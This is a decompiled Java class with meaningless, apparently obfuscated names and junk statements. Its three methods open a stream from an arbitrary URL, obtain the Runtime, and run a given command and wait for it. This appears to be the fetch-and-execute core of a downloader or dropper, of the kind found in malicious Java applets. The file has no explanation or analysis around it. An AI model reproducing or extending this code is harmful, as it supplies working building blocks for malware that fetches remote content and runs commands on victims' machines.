import java.net.URL;
import java.io.InputStream;

// 
// Decompiled by Procyon v0.5.30
// 

public class Sikol
{
    public static InputStream Gsome(final String oplwawt) throws Exception {
        final URL fnfsa = new URL(oplwawt);
        int cnt = 11;
        ++cnt;
        try {
            fnfsa.openConnection();
            final int c = 0;
        }
        catch (Exception ex) {}
        return fnfsa.openStream();
    }
    
    public static Runtime Poskne() {
        return Runtime.getRuntime();
    }
    
    public static void Wefmi(final String fn) throws Exception {
        final Process wsff = Poskne().exec(fn);
        wsff.waitFor();
    }
}
